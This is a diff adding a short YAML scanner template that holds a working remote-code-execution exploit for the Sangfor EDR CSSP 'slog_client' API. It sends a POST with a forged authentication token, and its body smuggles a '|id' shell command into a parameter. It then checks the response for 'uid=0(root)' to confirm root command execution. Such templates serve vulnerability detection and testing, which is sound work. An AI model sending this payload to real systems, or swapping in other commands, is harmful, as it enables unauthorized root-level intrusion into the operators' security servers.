@@ -1,0 +1,21 @@
+id: sangfor-edr-cssp-rce
+
+info:
+    name: sangfor-edr-cssp-rce
+    author: x1n9Qi8
+    severity: high
+
+manual: true
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /api/edr/sangforinter/v2/cssp/slog_client?token=eyJtZDUiOnRydWV9
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: '{"params":"w=123\"''1234123''\"|id"}'
+        expression: response.status == 200 && response.content_type.contains("json") && response.body.bcontains(b"uid=0(root)")
+expression: r0()
+
